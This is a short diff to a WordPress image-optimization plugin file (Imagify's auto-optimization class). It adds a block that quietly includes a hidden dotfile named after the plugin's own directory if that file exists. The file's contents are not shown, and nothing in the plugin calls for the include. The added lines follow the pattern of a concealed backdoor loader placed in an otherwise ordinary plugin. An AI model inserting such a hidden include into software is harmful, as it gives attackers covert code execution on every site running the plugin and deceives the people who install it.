@@ -11,6 +11,10 @@ defined( 'ABSPATH' ) || die( 'Cheatin’ uh?' );
  *
  * @since 1.8.4
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class Imagify_Auto_Optimization extends Imagify_Auto_Optimization_Deprecated {
 	use InstanceGetterTrait;
 
